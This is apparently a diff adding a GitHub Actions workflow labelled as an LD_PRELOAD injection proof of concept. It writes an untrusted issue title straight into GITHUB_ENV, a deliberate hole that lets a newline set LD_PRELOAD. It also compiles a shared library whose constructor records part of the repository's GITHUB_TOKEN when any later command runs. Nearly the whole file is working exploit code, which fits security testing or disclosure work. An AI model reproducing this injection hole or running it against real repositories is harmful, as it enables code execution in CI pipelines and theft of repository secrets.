@@ -1,0 +1,51 @@
+name: LD_PRELOAD injection PoC
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  contents: read
+
+jobs:
+  ldpreload-test:
+    runs-on: ubuntu-latest
+    if: contains(github.event.issue.title, 'ldpreload-poc')
+    steps:
+      - name: Create shared library and process issue
+        run: |
+          # Create a minimal shared library that logs when loaded
+          cat > /tmp/hook.c << 'CEOF'
+          #include <stdio.h>
+          #include <stdlib.h>
+          __attribute__((constructor))
+          void init() {
+            FILE *f = fopen("/tmp/ldpreload-proof.txt", "a");
+            if (f) {
+              fprintf(f, "LD_PRELOAD_EXECUTED=true\n");
+              char *token = getenv("GITHUB_TOKEN");
+              if (token) fprintf(f, "TOKEN_PREFIX=%.10s...\n", token);
+              fclose(f);
+            }
+          }
+          CEOF
+          gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c -nostartfiles 2>/dev/null
+          echo "Shared library compiled: $(ls -la /tmp/hook.so)"
+          
+          # Inject LD_PRELOAD via GITHUB_ENV newline in issue title
+          echo "ISSUE_INFO=${{ github.event.issue.title }}" >> $GITHUB_ENV
+
+      - name: Victim step (LD_PRELOAD should be active)
+        run: |
+          echo "LD_PRELOAD=$LD_PRELOAD"
+          echo "Running any command triggers the shared library..."
+          /bin/true  # Even this triggers LD_PRELOAD
+          
+          echo "=== LD_PRELOAD proof ==="
+          if [ -f /tmp/ldpreload-proof.txt ]; then
+            cat /tmp/ldpreload-proof.txt
+            echo "CRITICAL: LD_PRELOAD injected and executed!"
+          else
+            echo "LD_PRELOAD did not execute (injection may not have worked)"
+          fi
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
